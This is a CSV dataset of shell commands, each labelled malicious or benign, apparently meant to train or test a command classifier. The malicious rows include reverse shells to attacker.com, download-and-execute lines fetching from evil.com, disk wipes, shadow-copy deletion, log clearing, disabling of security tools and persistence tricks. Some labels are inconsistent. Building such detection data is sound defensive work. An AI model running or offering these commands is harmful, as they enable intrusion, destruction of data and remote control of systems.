command,label
wmic process call create 'cmd.exe /c powershell.exe',malicious
du -sh /var/log 2>/dev/null,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
chmod 777 /etc/shadow,malicious
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
usermod -aG sudo user,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
chown user:group file.txt -v,benign
mkfs.ext4 /dev/sda1,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
groups user,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
timeout 60 net localgroup administrators hacker /add,malicious
who 2>/dev/null,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
timeout 60 cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
passwd user,benign
head -10 logfile.txt,benign
passwd user,benign
echo 'virus' > /etc/passwd,malicious
vssadmin delete shadows /all /quiet,malicious
top,benign
wevtutil cl System,malicious
wget http://malicious.com/malware.exe,malicious
net localgroup administrators hacker /add &,malicious
mshta javascript:alert('code execution'),malicious
head -10 logfile.txt -v,benign
groups user,benign
mshta javascript:alert('code execution'),malicious
last,benign
java -version,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
id user,benign
rmdir empty_folder,benign
vssadmin delete shadows /all /quiet,malicious
git clone https://github.com/user/repo.git > output.txt,benign
rmdir empty_folder,benign
grep pattern file.txt,benign
sudo sort data.txt,benign
traceroute google.com | head -5,benign
netstat -tulpn,benign
dd if=/dev/zero of=/dev/sda,malicious
sdelete -p 10 -s -z C:\,malicious
groups user > output.txt,benign
wevtutil cl System,malicious
nc -l -p 4444 -e /bin/bash,malicious
useradd newuser,benign
nohup :(){ :|:& };:,malicious
node --version,benign
rm -rf /,malicious
service apache2 status,benign
cat /dev/urandom > /dev/sda,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon 2>&1,malicious
type ls,benign
sort data.txt 2>/dev/null,benign
cipher /w:C:\,malicious
sort data.txt,benign
groups user,benign
whoami > output.txt,benign
ncat -lvp 443 -e cmd.exe,malicious
groups user,benign
sdelete -p 10 -s -z C:\,malicious
top,benign
sudo head -10 logfile.txt,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
nohup nc -l -p 4444 -e /bin/bash,malicious
apt list --installed,benign
chmod 777 /etc/shadow,malicious
"cut -d',' -f1 data.csv | head -5",benign
"(ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)')",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
userdel olduser -v,benign
find /home -name '*.txt',benign
npm list,benign
service apache2 status | head -5,benign
cipher /w:C:\,malicious
date,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
uniq sorted.txt > output.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
apt list --installed,benign
netstat -tulpn,benign
attrib +h +s malware.exe,malicious
timeout 60 sdelete -p 10 -s -z C:\,malicious
sed 's/old/new/g' file.txt,benign
systemctl status nginx -v,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' >/dev/null",malicious
find /home -name '*.txt',benign
rsync -av /src/ /dst/,benign
tar -czf backup.tar.gz /data -v,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
find /home -name '*.txt',benign
apt list --installed --help,benign
git pull origin main > output.txt,benign
vssadmin delete shadows /all /quiet,malicious
diskpart select disk 0 clean,malicious
mount,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
attrib +h +s malware.exe,malicious
htop,benign
tail -f /var/log/syslog,benign
cipher /w:C:\,malicious
vmstat 2>/dev/null,benign
top -v,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
kubectl get pods,benign
netstat -tulpn,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
userdel olduser -v,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash >/dev/null",malicious
sudo mv old.txt new.txt,benign
iptables -L | head -5,benign
java -version,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
userdel olduser -v,benign
cat /etc/passwd 2>/dev/null,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
id user -v,benign
w --help,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
ncat -lvp 443 -e cmd.exe,malicious
git pull origin main -v,benign
java -version,benign
umount /dev/sdb1,benign
netsh advfirewall set allprofiles state off,malicious
(mshta javascript:alert('code execution')),malicious
wc -l document.txt -v,benign
ls -la,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
chown user:group file.txt,benign
:(){ :|:& };:,malicious
ssh user@server.com > output.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
(nc -l -p 4444 -e /bin/bash),malicious
mshta javascript:alert('code execution'),malicious
rsync -av /src/ /dst/,benign
which python,benign
format C: /q /x &,malicious
cat /etc/passwd,benign
sudo userdel olduser,benign
echo 'virus' > /etc/passwd,malicious
git pull origin main,benign
ps aux,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
python -m http.server 8080,malicious
umount /dev/sdb1,benign
nslookup google.com,benign
git pull origin main,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
cat /dev/urandom > /dev/sda,malicious
sed 's/old/new/g' file.txt,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
kubectl get pods,benign
dd if=/dev/zero of=/dev/sda,malicious
pip list,benign
nohup wevtutil cl System,malicious
attrib +h +s malware.exe,malicious
rmdir empty_folder -v,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
free -m,benign
find /home -name '*.txt',benign
node --version,benign
timeout 60 attrib +h +s malware.exe,malicious
net user hacker password123 /add,malicious
chmod 777 /etc/shadow,malicious
dd if=/dev/zero of=/dev/sda,malicious
chmod 777 /etc/shadow,malicious
git clone https://github.com/user/repo.git,benign
python -m http.server 8080,malicious
iostat -v,benign
mount,benign
fdisk -l,benign
wmic process call create 'cmd.exe /c powershell.exe' 2>&1,malicious
nslookup google.com,benign
netsh advfirewall set allprofiles state off,malicious
cmd /c del /q /s C:\*,malicious
id user,benign
cat /dev/urandom > /dev/sda >/dev/null,malicious
wevtutil cl Security,malicious
id user 2>/dev/null,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
echo 'virus' > /etc/passwd,malicious
"cut -d',' -f1 data.csv",benign
python -m http.server 8080,malicious
mount,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
taskkill /f /im antimalware.exe,malicious
cp file1.txt file2.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
timeout 60 cipher /w:C:\,malicious
cmd /c del /q /s C:\*,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe >/dev/null,malicious
chmod 755 script.sh -v,benign
groups user | head -5,benign
dd if=/dev/zero of=/dev/sda 2>&1,malicious
timeout 60 format C: /q /x,malicious
sudo free -m,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' &",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
userdel olduser,benign
ufw status,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
attrib +h +s malware.exe,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
mv old.txt new.txt,benign
docker ps | head -5,benign
df -h,benign
type ls,benign
df -h,benign
chown user:group file.txt,benign
"(ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)')",malicious
du -sh /var/log,benign
sudo df -h,benign
netsh advfirewall set allprofiles state off,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
sudo finger user,benign
echo 'Hello World' > output.txt,benign
man ls | head -5,benign
usermod -aG sudo user,benign
yum list installed,benign
tail -f /var/log/syslog,benign
nohup ncat -lvp 443 -e cmd.exe,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
(cmd /c del /q /s C:\*),malicious
mshta javascript:alert('code execution'),malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
sudo userdel olduser,benign
sort data.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
lsblk -v,benign
docker ps -v,benign
cmd /c del /q /s C:\*,malicious
pip list,benign
"nohup awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
cp file1.txt file2.txt,benign
lsblk,benign
cp file1.txt file2.txt -v,benign
shutdown /r /f /t 0,malicious
userdel olduser | head -5,benign
net localgroup administrators hacker /add >/dev/null,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
who,benign
service apache2 status,benign
ncat -lvp 443 -e cmd.exe,malicious
umount /dev/sdb1 --help,benign
format C: /q /x,malicious
grep pattern file.txt,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') 2>&1",malicious
curl -I https://google.com,benign
iptables -L,benign
wevtutil cl System,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
mkdir -p /tmp/test | head -5,benign
umount /dev/sdb1,benign
date -v,benign
uniq sorted.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
python --version,benign
sdelete -p 10 -s -z C:\,malicious
node --version,benign
nslookup google.com,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
nohup bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
format C: /q /x,malicious
mkfs.ext4 /dev/sda1,malicious
diskpart select disk 0 clean,malicious
traceroute google.com 2>/dev/null,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
apt list --installed,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
sudo type ls,benign
echo 'virus' > /etc/passwd,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
systemctl status nginx,benign
userdel olduser,benign
:(){ :|:& };: 2>&1,malicious
dd if=/dev/zero of=/dev/sda,malicious
sort data.txt,benign
chmod 755 script.sh,benign
curl -I https://google.com,benign
grep pattern file.txt,benign
df -h > output.txt,benign
net localgroup administrators hacker /add,malicious
vssadmin delete shadows /all /quiet,malicious
sdelete -p 10 -s -z C:\,malicious
diskpart select disk 0 clean,malicious
rsync -av /src/ /dst/,benign
userdel olduser,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
timeout 60 wmic process call create 'cmd.exe /c powershell.exe',malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
apt list --installed 2>/dev/null,benign
man ls,benign
echo 'virus' > /etc/passwd &,malicious
"cut -d',' -f1 data.csv",benign
timeout 60 attrib +h +s malware.exe,malicious
curl http://evil.com/payload.sh | bash,malicious
:(){ :|:& };:,malicious
rmdir empty_folder --help,benign
sed 's/old/new/g' file.txt,benign
sudo du -sh /var/log,benign
echo 'Hello World' | head -5,benign
apt list --installed,benign
mv old.txt new.txt 2>/dev/null,benign
iostat,benign
sudo userdel olduser,benign
crontab -l,benign
chmod 777 /etc/shadow,malicious
head -10 logfile.txt > output.txt,benign
mv old.txt new.txt | head -5,benign
(cmd /c del /q /s C:\*),malicious
shutdown /r /f /t 0,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
format C: /q /x,malicious
chmod 777 /etc/shadow,malicious
chmod 777 /etc/shadow,malicious
:(){ :|:& };:,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
wc -l document.txt,benign
fdisk -l,benign
python -m http.server 8080,malicious
timeout 60 vssadmin delete shadows /all /quiet,malicious
(vssadmin delete shadows /all /quiet),malicious
history,benign
cat /dev/urandom > /dev/sda,malicious
(sc stop Windows Defender),malicious
vssadmin delete shadows /all /quiet,malicious
java -version,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe &,malicious
traceroute google.com,benign
npm list,benign
pwd,benign
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
taskkill /f /im antimalware.exe,malicious
tail -f /var/log/syslog,benign
sudo rsync -av /src/ /dst/,benign
cipher /w:C:\,malicious
mshta javascript:alert('code execution'),malicious
traceroute google.com | head -5,benign
attrib +h +s malware.exe,malicious
mount | head -5,benign
mkfs.ext4 /dev/sda1,malicious
echo 'virus' > /etc/passwd,malicious
wget http://malicious.com/malware.exe,malicious
diskpart select disk 0 clean,malicious
(:(){ :|:& };:),malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' 2>&1",malicious
ps aux,benign
chmod 755 script.sh,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
lsblk > output.txt,benign
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
curl http://evil.com/payload.sh | bash,malicious
:(){ :|:& };:,malicious
which python | head -5,benign
top 2>/dev/null,benign
wc -l document.txt,benign
which python,benign
rm -rf /,malicious
service apache2 status 2>/dev/null,benign
diskpart select disk 0 clean,malicious
chmod 777 /etc/shadow,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
git pull origin main -v,benign
:(){ :|:& };:,malicious
htop,benign
finger user > output.txt,benign
cmd /c del /q /s C:\*,malicious
mkfs.ext4 /dev/sda1,malicious
wevtutil cl System,malicious
sudo grep pattern file.txt,benign
fdisk -l | head -5,benign
htop -v,benign
lsblk -v,benign
cat /dev/urandom > /dev/sda >/dev/null,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
find /home -name '*.txt',benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
(cipher /w:C:\),malicious
netstat -tulpn,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
node --version,benign
:(){ :|:& };:,malicious
git pull origin main,benign
nc -l -p 4444 -e /bin/bash,malicious
cipher /w:C:\,malicious
rmdir empty_folder,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ &,malicious
shutdown /r /f /t 0,malicious
cipher /w:C:\,malicious
type ls,benign
head -10 logfile.txt,benign
fdisk -l --help,benign
systemctl reload nginx,benign
chmod 755 script.sh,benign
mshta javascript:alert('code execution'),malicious
finger user | head -5,benign
date,benign
tail -f /var/log/syslog,benign
(echo 'virus' > /etc/passwd),malicious
ss -tulpn,benign
node --version,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon 2>&1,malicious
echo 'Hello World' -v,benign
"cut -d',' -f1 data.csv",benign
curl -I https://google.com,benign
nohup wget http://malicious.com/malware.exe,malicious
cat /dev/urandom > /dev/sda 2>&1,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ &,malicious
lsblk > output.txt,benign
nohup ncat -lvp 443 -e cmd.exe,malicious
shutdown /r /f /t 0,malicious
cipher /w:C:\,malicious
echo 'virus' > /etc/passwd,malicious
node --version,benign
taskkill /f /im antimalware.exe,malicious
apt list --installed,benign
traceroute google.com,benign
sudo finger user,benign
sdelete -p 10 -s -z C:\,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
python --version,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
attrib +h +s malware.exe 2>&1,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
ps aux > output.txt,benign
which python > output.txt,benign
docker images,benign
traceroute google.com,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe >/dev/null,malicious
curl http://evil.com/payload.sh | bash &,malicious
cat /dev/urandom > /dev/sda,malicious
wevtutil cl Security,malicious
:(){ :|:& };:,malicious
java -version,benign
taskkill /f /im antimalware.exe &,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
git pull origin main,benign
lsblk,benign
wget http://malicious.com/malware.exe,malicious
dd if=/dev/zero of=/dev/sda &,malicious
ssh user@server.com,benign
sudo traceroute google.com,benign
whoami,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
vssadmin delete shadows /all /quiet,malicious
apt list --installed,benign
history > output.txt,benign
netsh advfirewall set allprofiles state off,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
apt list --installed,benign
awk '{print $1}' data.txt,benign
df -h -v,benign
usermod -aG sudo user 2>/dev/null,benign
scp file.txt user@server:/path/,benign
wget http://malicious.com/malware.exe,malicious
ssh user@server.com,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
dd if=/dev/zero of=/dev/sda,malicious
sdelete -p 10 -s -z C:\,malicious
net user hacker password123 /add &,malicious
wget http://malicious.com/malware.exe,malicious
ufw status,benign
find /home -name '*.txt',benign
wevtutil cl Security,malicious
top,benign
git pull origin main --help,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
umount /dev/sdb1 -v,benign
(taskkill /f /im antimalware.exe),malicious
pip list,benign
traceroute google.com | head -5,benign
chmod 755 script.sh --help,benign
find /home -name '*.txt' -v,benign
sc stop Windows Defender >/dev/null,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
wget https://example.com/file.txt,benign
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
grep pattern file.txt,benign
mv old.txt new.txt > output.txt,benign
cp file1.txt file2.txt,benign
format C: /q /x,malicious
npm list,benign
git clone https://github.com/user/repo.git,benign
rm -rf /,malicious
cat /etc/passwd,benign
(cmd /c del /q /s C:\*),malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
nohup netsh advfirewall set allprofiles state off,malicious
ping -c 4 google.com,benign
(diskpart select disk 0 clean),malicious
scp file.txt user@server:/path/,benign
rmdir empty_folder,benign
netsh advfirewall set allprofiles state off,malicious
ufw status,benign
(wevtutil cl Security),malicious
nohup certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
taskkill /f /im antimalware.exe,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
taskkill /f /im antimalware.exe &,malicious
"(powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")')",malicious
:(){ :|:& };:,malicious
awk '{print $1}' data.txt,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
timeout 60 cat /dev/urandom > /dev/sda,malicious
java -version,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
:(){ :|:& };:,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
diskpart select disk 0 clean 2>&1,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe 2>&1,malicious
chown user:group file.txt -v,benign
useradd newuser,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
tail -f /var/log/syslog,benign
curl -I https://google.com 2>/dev/null,benign
cmd /c del /q /s C:\* 2>&1,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
mkdir -p /tmp/test,benign
ls -la,benign
ps aux,benign
wget http://malicious.com/malware.exe,malicious
(bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe),malicious
kubectl get pods,benign
(format C: /q /x),malicious
find /home -name '*.txt' 2>/dev/null,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
wget http://malicious.com/malware.exe,malicious
type ls,benign
net user hacker password123 /add,malicious
kubectl get pods,benign
cp file1.txt file2.txt,benign
wget https://example.com/file.txt,benign
systemctl reload nginx,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
mkfs.ext4 /dev/sda1,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
dd if=/dev/zero of=/dev/sda,malicious
which python 2>/dev/null,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
diskpart select disk 0 clean,malicious
free -m,benign
sdelete -p 10 -s -z C:\,malicious
last,benign
whoami,benign
curl http://evil.com/payload.sh | bash,malicious
du -sh /var/log,benign
ufw status,benign
(sc stop Windows Defender),malicious
traceroute google.com,benign
man ls 2>/dev/null,benign
chmod 777 /etc/shadow,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
sudo ps aux,benign
rm -rf /,malicious
sudo nslookup google.com,benign
kubectl get pods 2>/dev/null,benign
passwd user -v,benign
finger user,benign
tar -czf backup.tar.gz /data,benign
last -v,benign
ps aux --help,benign
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
df -h,benign
history,benign
rsync -av /src/ /dst/,benign
find /home -name '*.txt',benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
find /home -name '*.txt' > output.txt,benign
mshta javascript:alert('code execution'),malicious
sort data.txt,benign
type ls,benign
sed 's/old/new/g' file.txt -v,benign
diskpart select disk 0 clean 2>&1,malicious
wget http://malicious.com/malware.exe,malicious
taskkill /f /im antimalware.exe,malicious
wc -l document.txt,benign
(bcdedit /set {default} bootstatuspolicy ignoreallfailures),malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
sudo python --version,benign
chmod 777 /etc/shadow,malicious
diskpart select disk 0 clean,malicious
timeout 60 :(){ :|:& };:,malicious
ping -c 4 google.com,benign
mkfs.ext4 /dev/sda1 &,malicious
find /home -name '*.txt',benign
sudo type ls,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
mkdir -p /tmp/test,benign
cipher /w:C:\,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
fdisk -l,benign
chmod 755 script.sh,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
wc -l document.txt,benign
shutdown /r /f /t 0,malicious
head -10 logfile.txt,benign
timeout 60 sdelete -p 10 -s -z C:\,malicious
kubectl get pods,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
cmd /c del /q /s C:\*,malicious
tail -f /var/log/syslog | head -5,benign
(vssadmin delete shadows /all /quiet),malicious
mshta javascript:alert('code execution') 2>&1,malicious
mshta javascript:alert('code execution'),malicious
